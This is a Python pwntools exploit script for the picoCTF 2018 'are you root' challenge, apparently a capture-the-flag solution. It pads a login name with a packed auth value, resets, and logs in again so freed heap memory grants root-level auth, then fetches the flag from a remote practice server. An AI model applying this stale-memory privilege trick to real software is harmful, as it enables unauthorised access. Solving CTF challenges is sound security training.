# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = 'picoctf_2018_are_you_root'
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

islocal = 0
if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 25147)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))


def login(name):
    p.sendline("login " + name)

def show():
    p.sendline("show")

def set_auth(level):
    p.sendline("set-auth" + str(level))

def reset():
    p.sendline("reset")

def get_flag():
    p.sendline("get-flag")

def pwn():
    login("klose2jo" + p64(5))
    reset()
    login("klose")
    get_flag()

    p.interactive()


if __name__ == '__main__':
    pwn()